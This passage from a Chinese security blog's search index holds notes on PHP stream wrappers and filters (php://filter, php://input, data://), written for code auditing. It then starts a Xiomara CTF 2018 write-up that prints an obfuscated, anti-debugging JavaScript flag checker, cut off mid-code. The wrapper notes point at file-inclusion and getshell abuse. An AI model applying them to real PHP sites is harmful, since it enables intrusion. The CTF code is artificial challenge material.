class="line">这些修饰符是可以混合使用的。例如 /ig、/ie等。</span><br></pre></td></tr></table></figure><h3 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php 伪协议"></a>php 伪协议</h3><p>file:// — 访问本地文件系统<br>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs</p><h4 id="php-—-访问各个输入-输出流（I-O-streams）"><a href="#php-—-访问各个输入-输出流（I-O-streams）" class="headerlink" title="php:// — 访问各个输入/输出流（I/O streams）"></a>php:// — 访问各个输入/输出流（I/O streams）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">llow_url_fopen 和allow_url_include会影响到fopen等等和include等等函数对于伪协议的支持，而allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的。</span><br><span class="line"></span><br><span class="line">php://input</span><br><span class="line">t可以获取到post的数据</span><br><span class="line">enctype=&quot;multipart/form-data&quot;的时候 php://input 是无效的</span><br><span class="line"></span><br><span class="line">php://output</span><br><span class="line">php://output 是一个只写的数据流</span><br><span class="line">php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</span><br><span class="line">事实上，在include函数的使用上，经常会造成任意文件读取漏洞，而file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。</span><br><span class="line">php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。</span><br></pre></td></tr></table></figure><p>zlib:// — 压缩流</p><h4 id="data-—-数据（RFC-2397）"><a href="#data-—-数据（RFC-2397）" class="headerlink" title="data:// — 数据（RFC 2397）"></a>data:// — 数据（RFC 2397）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;=PHP 5.2.0</span><br><span class="line">allow_url_include = on</span><br><span class="line"></span><br><span class="line">data://text/plain;base64,</span><br><span class="line">data://text/plain;base64,SSBsb3ZlIFBIUAo=</span><br><span class="line">data://image/jpeg;base64,</span><br><span class="line">data:text/plain,</span><br><span class="line">data:text/plain;base64,</span><br></pre></td></tr></table></figure><p>glob:// — 查找匹配的文件路径模式<br>phar:// — PHP 归档<br>ssh2:// — Secure Shell 2<br>rar:// — RAR<br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p><h3 id="php过滤器"><a href="#php过滤器" class="headerlink" title="php过滤器"></a>php过滤器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String Filters</span><br><span class="line">string.rot13  - rot13</span><br><span class="line">string.toupper - 大写</span><br><span class="line">string.tolower - 小写</span><br><span class="line">string.strip_tags - 去除tags</span><br><span class="line">Conversion Filters</span><br><span class="line">convert.base64-encode - base64 编码</span><br><span class="line">convert.base64-decode - base64 解码 </span><br><span class="line">convert.quoted-printable-encode  </span><br><span class="line">convert.quoted-printable-decode</span><br><span class="line">Compression Filters</span><br><span class="line">zlib.deflate</span><br><span class="line">zlib.inflate</span><br><span class="line">bzip2.compress</span><br><span class="line">bzip2.decompress</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Xiomara-ctf-2018</title>
      <link href="//blog/2018/Xiomara-ctf-2018.html"/>
      <url>//blog/2018/Xiomara-ctf-2018.html</url>
      
        <content type="html"><![CDATA[<h2 id="Flag-Checker-V1-0"><a href="#Flag-Checker-V1-0" class="headerlink" title="Flag Checker V1.0"></a>Flag Checker V1.0</h2><p><img src="/img/xiomara/1.png" alt=""><br>直接看出是JsFuck<br>找个JsFuck解密网站<br><a href="https://enkhee-osiris.github.io/Decoder-JSFuck/" target="_blank" rel="noopener">https://enkhee-osiris.github.io/Decoder-JSFuck/</a><br><img src="/img/xiomara/2.png" alt=""><br>得到flag</p><h2 id="Flag-Checker-V2-0"><a href="#Flag-Checker-V2-0" class="headerlink" title="Flag Checker V2.0"></a>Flag Checker V2.0</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">_0x2e4d58, _0x14c882</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x18c2d3 = <span class="function"><span class="keyword">function</span>(<span class="params">_0x28e4b7</span>) </span>&#123;</span><br><span class="line"><span class="keyword">while</span> (--_0x28e4b7) &#123;</span><br><span class="line">_0x2e4d58[<span class="string">'push'</span>](_0x2e4d58[<span class="string">'shift'</span>]());</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">_0x18c2d3(++_0x14c882);</span><br><span class="line">&#125;(_0x5e62, <span class="number">0xa9</span>));</span><br><span class="line"><span class="keyword">var</span> _0x5125 = <span class="function"><span class="keyword">function</span>(<span class="params">_0x4d6021, _0x3f8d8b</span>) </span>&#123;</span><br><span class="line">_0x4d6021 = _0x4d6021 - <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">var</span> _0x2dfd7f = _0x5e62[_0x4d6021];</span><br><span class="line"><span class="keyword">if</span> (_0x5125[<span class="string">'initialized'</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x5307f8 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0xdd3db6;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">_0xdd3db6 = <span class="built_in">Function</span>(<span class="string">'return\x20(function()\x20'</span> + <span class="string">'&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)'</span> + <span class="string">');'</span>)();</span><br><span class="line">&#125; <span class="keyword">catch</span> (_0x29e69c) &#123;</span><br><span class="line">_0xdd3db6 = <span class="built_in">window</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _0xdd3db6;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _0x23f59c = _0x5307f8();</span><br><span class="line"><span class="keyword">var</span> _0x48a914 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;</span><br><span class="line">_0x23f59c[<span class="string">'atob'</span>] || (_0x23f59c[<span class="string">'atob'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">_0x206b25</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x92d18 = <span class="built_in">String</span>(_0x206b25)[<span class="string">'replace'</span>](<span class="regexp">/=+$/</span>, <span class="string">''</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> _0x1e27fd = <span class="number">0x0</span>, _0x20f59d, _0x446dfa, _0x53651c = <span class="number">0x0</span>, _0x49c025 = <span class="string">''</span>; _0x446dfa = _0x92d18[<span class="string">'charAt'</span>](_0x53651c++); ~_0x446dfa &amp;&amp; (_0x20f59d = _0x1e27fd % <span class="number">0x4</span> ? _0x20f59d * <span class="number">0x40</span> + _0x446dfa : _0x446dfa, _0x1e27fd++ % <span class="number">0x4</span>) ? _0x49c025 += <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](<span class="number">0xff</span> &amp; _0x20f59d &gt;&gt; (<span class="number">-0x2</span> * _0x1e27fd &amp; <span class="number">0x6</span>)) : <span class="number">0x0</span>) &#123;</span><br><span class="line">_0x446dfa = _0x48a914[<span class="string">'indexOf'</span>](_0x446dfa);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _0x49c025;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;());</span><br><span class="line"><span class="keyword">var</span> _0x3a355d = <span class="function"><span class="keyword">function</span>(<span class="params">_0x53f2b0, _0x2b3688</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x1ed54c = [],</span><br><span class="line">_0x5d1d31 = <span class="number">0x0</span>,</span><br><span class="line">_0x4734e1, _0x5a14e7 = <span class="string">''</span>,</span><br><span class="line">_0xc8ab15 = <span class="string">''</span>;</span><br><span class="line">_0x53f2b0 = atob(_0x53f2b0);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> _0x41e1e2 = <span class="number">0x0</span>, _0x39eca1 = _0x53f2b0[<span class="string">'length'</span>]; _0x41e1e2 &lt; _0x39eca1; _0x41e1e2++) &#123;</span><br><span class="line">_0xc8ab15 += <span class="string">'%'</span> + (<span class="string">'00'</span> + _0x53f2b0[<span class="string">'charCodeAt'</span>](_0x41e1e2)[<span class="string">'toString'</span>](<span class="number">0x10</span>))[<span class="string">'slice'</span>](<span class="number">-0x2</span>);</span><br><span class="line">&#125;</span><br><span class="line">_0x53f2b0 = <span class="built_in">decodeURIComponent</span>(_0xc8ab15);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> _0x4ab6e5 = <span class="number">0x0</span>; _0x4ab6e5 &lt; <span class="number">0x100</span>; _0x4ab6e5++) &#123;</span><br><span class="line">_0x1ed54c[_0x4ab6e5] = _0x4ab6e5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (_0x4ab6e5 = <span class="number">0x0</span>; _0x4ab6e5 &lt; <span class="number">0x100</span>; _0x4ab6e5++) &#123;</span><br><span class="line">_0x5d1d31 = (_0x5d1d31 + _0x1ed54c[_0x4ab6e5] + _0x2b3688[<span class="string">'charCodeAt'</span>](_0x4ab6e5 % _0x2b3688[<span class="string">'length'</span>])) % <span class="number">0x100</span>;</span><br><span class="line">_0x4734e1 = _0x1ed54c[_0x4ab6e5];</span><br><span class="line">_0x1ed54c[_0x4ab6e5] = _0x1ed54c[_0x5d1d31];</span><br><span class="line">_0x1ed54c[_0x5d1d31] = _0x4734e1;</span><br><span class="line">&#125;</span><br><span class="line">_0x4ab6e5 = <span class="number">0x0</span>;</span><br><span class="line">_0x5d1d31 = <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> _0x388b4a = <span class="number">0x0</span>; _0x388b4a &lt; _0x53f2b0[<span class="string">'length'</span>]; _0x388b4a++) &#123;</span><br><span class="line">_0x4ab6e5 = (_0x4ab6e5 + <span class="number">0x1</span>) % <span class="number">0x100</span>;</span><br><span class="line">_0x5d1d31 = (_0x5d1d31 + _0x1ed54c[_0x4ab6e5]) % <span class="number">0x100</span>;</span><br><span class="line">_0x4734e1 = _0x1ed54c[_0x4ab6e5];</span><br><span class="line">_0x1ed54c[_0x4ab6e5] = _0x1ed54c[_0x5d1d31];</span><br><span class="line">_0x1ed54c[_0x5d1d31] = _0x4734e1;</span><br><span class="line">_0x5a14e7 += <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](_0x53f2b0[<span class="string">'charCodeAt'</span>](_0x388b4a) ^ _0x1ed54c[(_0x1ed54c[_0x4ab6e5] + _0x1ed54c[_0x5d1d31]) % <span class="number">0x100</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _0x5a14e7;</span><br><span class="line">&#125;;</span><br><span class="line">_0x5125[<span class="string">'rc4'</span>] = _0x3a355d;</span><br><span class="line">_0x5125[<span class="string">'data'</span>] = &#123;&#125;;</span><br><span class="line">_0x5125[<span class="string">'initialized'</span>] = !![];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> _0x2669d5 = _0x5125[<span class="string">'data'</span>][_0x4d6021];</span><br><span class="line"><span class="keyword">if</span> (_0x2669d5 === <span class="literal">undefined</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125[<span class="string">'once'</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">_0x5125[<span class="string">'once'</span>] = !![];</span><br><span class="line">&#125;</span><br><span class="line">_0x2dfd7f = _0x5125[<span class="string">'rc4'</span>](_0x2dfd7f, _0x3f8d8b);</span><br><span class="line">_0x5125[<span class="string">'data'</span>][_0x4d6021] = _0x2dfd7f;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">_0x2dfd7f = _0x2669d5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _0x2dfd7f;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Flagchecker</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x1b5eee = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125(<span class="string">'0x0'</span>, <span class="string">'J@5k'</span>) === _0x5125(<span class="string">'0x1'</span>, <span class="string">'L3c^'</span>)) &#123;</span><br><span class="line"><span class="keyword">var</span> _0xc90922 = !![];</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">_0x16a9c8, _0x4fe105</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125(<span class="string">'0x2'</span>, <span class="string">'Dzjs'</span>) !== _0x5125(<span class="string">'0x3'</span>, <span class="string">'EDGr'</span>)) &#123;</span><br><span class="line">alert(_0x5125(<span class="string">'0x4'</span>, <span class="string">'s7M5'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">var</span> _0x319d80 = _0xc90922 ? <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (_0x4fe105) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'SsT'</span> !== _0x5125(<span class="string">'0x5'</span>, <span class="string">'1IMg'</span>)) &#123;</span><br><span class="line"><span class="keyword">var</span> _0x426ff5 = _0x4fe105[_0x5125(<span class="string">'0x6'</span>, <span class="string">'yKm@'</span>)](_0x16a9c8, <span class="built_in">arguments</span>);</span><br><span class="line">_0x4fe105 = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">return</span> _0x426ff5;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">_0x3403b6();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">_0xc90922 = ![];</span><br><span class="line"><span class="keyword">return</span> _0x319d80;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;&#125;</span><br><span class="line">&#125;();</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">_0x1b5eee(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x1a2fe9 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(_0x5125(<span class="string">'0x7'</span>, <span class="string">'1q4J'</span>));</span><br><span class="line"><span class="keyword">var</span> _0x1c96fe = <span class="keyword">new</span> <span class="built_in">RegExp</span>(_0x5125(<span class="string">'0x8'</span>, <span class="string">'yKm@'</span>), <span class="string">'i'</span>);</span><br><span class="line"><span class="keyword">var</span> _0x4289ea = _0x3403b6(_0x5125(<span class="string">'0x9'</span>, <span class="string">'!Uio'</span>));</span><br><span class="line"><span class="keyword">if</span> (!_0x1a2fe9[<span class="string">'test'</span>](_0x4289ea + _0x5125(<span class="string">'0xa'</span>, <span class="string">'I$aA'</span>)) || !_0x1c96fe[_0x5125(<span class="string">'0xb'</span>, <span class="string">']!tO'</span>)](_0x4289ea + _0x5125(<span class="string">'0xc'</span>, <span class="string">'8T#5'</span>))) &#123;</span><br><span class="line">_0x4289ea(<span class="string">'0'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125(<span class="string">'0xd'</span>, <span class="string">'Xc[6'</span>) !== _0x5125(<span class="string">'0xe'</span>, <span class="string">'Xc[6'</span>)) &#123;</span><br><span class="line">_0x3403b6();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (fn) &#123;</span><br><span class="line"><span class="keyword">var</span> _0x7fb3fa = fn[_0x5125(<span class="string">'0xf'</span>, <span class="string">'XK7W'</span>)](context, <span class="built_in">arguments</span>);</span><br><span class="line">fn = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">return</span> _0x7fb3fa;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br><span class="line">&#125;());</span><br><span class="line"><span class="keyword">var</span> _0x52b070;</span><br><span class="line">_0x52b070 = prompt(_0x5125(<span class="string">'0x10'</span>, <span class="string">'D5FN'</span>));</span><br><span class="line"><span class="keyword">if</span> (_0x52b070 == _0x5125(<span class="string">'0x11'</span>, <span class="string">']!tO'</span>)) &#123;</span><br><span class="line">alert(<span class="string">'You\x20got\x20the\x20right\x20flag'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125(<span class="string">'0x12'</span>, <span class="string">'JVHN'</span>) !== _0x5125(<span class="string">'0x13'</span>, <span class="string">'Jk8w'</span>)) &#123;</span><br><span class="line">alert(_0x5125(<span class="string">'0x14'</span>, <span class="string">'&amp;lOq'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Flagchecker();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x3403b6</span>(<span class="params">_0x354367</span>) </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x4aebc3</span>(<span class="params">_0x4e9ce3</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125(<span class="string">'0x15'</span>, <span class="string">'AiHJ'</span>) === _0x5125(<span class="string">'0x16'</span>, <span class="string">')8XU'</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> _0x4e9ce3 === <span class="string">'string'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'TTd'</span> !== _0x5125(<span class="string">'0x17'</span>, <span class="string">'1PZG'</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">_0xd56fe</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125(<span class="string">'0x18'</span>, <span class="string">'JVHN'</span>) === <span class="string">'Ufl'</span>) &#123;</span><br><span class="line">_0x2c6a94(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x424a7e = <span class="keyword">new</span> <span class="built_in">RegExp</span>(_0x5125(<span class="string">'0x19'</span>, <span class="string">'n!bY'</span>));</span><br><span class="line"><span class="keyword">var</span> _0xff353c = <span class="keyword">new</span> <span class="built_in">RegExp</span>(_0x5125(<span class="string">'0x1a'</span>, <span class="string">'3aUN'</span>), <span class="string">'i'</span>);</span><br><span class="line"><span class="keyword">var</span> _0x58c884 = _0x3403b6(_0x5125(<span class="string">'0x1b'</span>, <span class="string">'FKZQ'</span>));</span><br><span class="line"><span class="keyword">if</span> (!_0x424a7e[_0x5125(<span class="string">'0x1c'</span>, <span class="string">'Xc[6'</span>)](_0x58c884 + <span class="string">'chain'</span>) || !_0xff353c[_0x5125(<span class="string">'0x1d'</span>, <span class="string">'U*wC'</span>)](_0x58c884 + _0x5125(<span class="string">'0x1e'</span>, <span class="string">'2cJD'</span>))) &#123;</span><br><span class="line">_0x58c884(<span class="string">'0'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">_0x3403b6();</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;&#125;</span><br><span class="line">&#125;[<span class="string">'constructor'</span>](_0x5125(<span class="string">'0x1f'</span>, <span class="string">'he^b'</span>))[_0x5125(<span class="string">'0x20'</span>, <span class="string">']!tO'</span>)](<span class="string">'counter'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">_0x4aebc3(<span class="number">0x0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="string">''</span> + _0x4e9ce3 / _0x4e9ce3)[<span class="string">'length'</span>] !== <span class="number">0x1</span> || _0x4e9ce3 % <span class="number">0x14</span> === <span class="number">0x0</span>) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !![];</span><br><span class="line">&#125;[_0x5125(<span class="string">'0x21'</span>, <span class="string">'zzBK'</span>)](_0x5125(<span class="string">'0x22'</span>, <span class="string">']!tO'</span>) + _0x5125(<span class="string">'0x23'</span>, <span class="string">'!Uio'</span>))[_0x5125(<span class="string">'0x24'</span>, <span class="string">'!Uio'</span>)](_0x5125(<span class="string">'0x25'</span>, <span class="string">'uYRx'</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125(<span class="string">'0x26'</span>, <span class="string">'rh2n'</span>) === _0x5125(<span class="string">'0x27'</span>, <span class="string">'8T#5'</span>)) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125(<span class="string">'0x28'</span>, <span class="string">'Xc[6'</span>) !== <span class="string">'qfd'</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> ![];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> !![];</span><br><span class="line">&#125;</span><br><span class="line">&#125;[_0x5125(<span class="string">'0x29'</span>, <span class="string">'J@5k'</span>)](<span class="string">'debu'</span> + _0x5125(<span class="string">'0x2a'</span>, <span class="string">'4q2W'</span>))[_0x5125(<span class="string">'0x2b'</span>, <span class="string">'4q2W'</span>)](_0x5125(<span class="string">'0x2c'</span>, <span class="string">'1PZG'</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">var</span> _0x5e081d = fn[_0x5125(<span class="string">'0x2d'</span>, <span class="string">'AiHJ'</span>)](context, <span class="built_in">arguments</span>);</span><br><span class="line">fn = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">return</span> _0x5e081d;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">_0x4aebc3(++_0x4e9ce3);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ![];</span><br><span class="line">&#125;[_0x5125(<span class="string">'0x2e'</span>, <span class="string">'2cJD'</span>)](_0x5125(<span class="string">'0x2f'</span>, <span class="string">'JVHN'</span>) + _0x5125(<span class="string">'0x30'</span>, <span class="string">'c(RF'</span>))[_0x5125(<span class="string">'0x20'</span>, <span class="string">']!tO'</span>)](_0x5125(<span class="string">'0x31'</span>, <span class="string">'aV%O'</span>)));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (_0x5125(<span class="string">'0x32'</span>, <span class="string">'CCXy'</span>) !== _0x5125(<span class="string">'0x33'</span>, <span class="string">'FKZQ'</span>)) &#123;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (_0x354367) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'OvD'</span> !== _0x5125(<span class="string">'0x34'</span>, <span class="string">'Z!WV'</span>)) &#123;</span><br><span class="line">alert(_0x5125(<span class="string">'0x35'</span>, <span class="string">'Dzjs'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> _0x4aebc3;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">_0x4aebc3(<span class="number">0x0</span>);</span><br><span 